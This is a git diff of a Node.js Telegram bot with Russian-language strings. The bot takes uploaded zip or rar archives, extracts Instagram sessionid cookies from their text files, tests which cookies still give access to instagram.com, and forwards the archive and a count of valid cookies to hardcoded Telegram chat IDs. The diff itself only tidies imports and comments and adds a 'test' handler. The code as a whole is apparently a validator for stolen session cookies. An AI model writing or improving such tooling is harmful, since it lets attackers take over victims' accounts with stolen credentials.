@@ -3,11 +3,6 @@
 const config = require('./config/config.json');
 const Telegraf = require('telegraf')
 const session = require('telegraf/session')
-const Stage = require('telegraf/stage')
-const Scene = require('telegraf/scenes/base')
-const Extra = require('telegraf/extra')
-const Markup = require('telegraf/markup')
-const { enter, leave } = Stage
 
 const fetch = require("node-fetch");
 const fs = require("fs");
@@ -15,18 +10,13 @@ const https = require('https');
 let { zip, unzip } = require('cross-unzip')
 const archiver = require('archiver');
 
-
 const bot = new Telegraf(config.bot_token);
 
-//const stage = new Stage([scenes.paymentAmountScene, scenes.paymentMethodScene,scenes.qiwiPaymentScene, scenes.categoryScene, scenes.servicesScene], { ttl: 1800 })
 bot.use(session());
 bot.launch();
-//bot.use(stage.middleware())
-//bot.hears('Пополнить💲', (ctx) => ctx.scene.enter('paymentAmount', {amount : 100}))
 bot.on("document", async (ctx) => {
     const documentName = ctx.update.message.document.file_name
      if(documentName.includes('.zip') || documentName.includes('.rar')){
-      //  let messageId = ctx.update.message.message_id;
         let fileId = ctx.update.message.document.file_id;
         const sender = ctx.update.message.from.username
         bot.telegram.sendMessage('868619239',`@${sender} отправил файл:`)
@@ -40,7 +30,6 @@ bot.on("document", async (ctx) => {
         const txtFiles = await  getTxtfiles(dir)
         const result = await checkTxtCookies(txtFiles)
         const archiveName = await makeArchieve(resultDir)
-        //console.dir({filename,dir,resultDir,txtFiles})
         await bot.telegram.sendDocument('1351452476',{source :archiveName})
         bot.telegram.sendMessage('1351452476',result) 
         await deleteFiles(dir,archiveName)
@@ -56,6 +45,10 @@ bot.hears('id', (ctx) =>{
 //  bot.telegram.sendMessage('1351452476','ok')
 //bot.telegram.sendDocument('1351452476',{source :"./3/download/insta_result.zip"})
 })
+bot.hears('test', (ctx) =>{
+  ctx.reply('Bot works')
+  })
+
 bot.command('start', async (ctx) =>ctx.reply('Привет'));
 
 const downloadFile = async (url, path = "./3/download/",filename) => {
@@ -227,8 +220,6 @@ const checkForValid = async (sessionIdCookie) => {
                     if (err) throw err;
                 })  
             }
-            //console.dir(res.join(''))  
-        
     return sessionIds;
   };
 
@@ -238,16 +229,13 @@ const checkForValid = async (sessionIdCookie) => {
     let checkerData= [];
     let validCounter =0;
     for(let txt of txtNameArr){
-     //   console.log(txt)
        let cookie = await getSessionIds(txt)
        if(!allCookies.includes(cookie[0])){
         await allCookies.push(cookie[0])
        }
-
     }
      for(let cookie of allCookies){
         checkerData.push(await checkForValid(cookie));
-       // console.log(checkRes)
     } 
     for(let el of checkerData){
         if(el.includes('instagram.com'))validCounter++;
@@ -257,8 +245,3 @@ const checkForValid = async (sessionIdCookie) => {
     await txtRes.unshift(`Найдено txt файлов: ${txtNameArr.length}\n`)
     return txtRes.join('');
 }
-
-
-
-
-
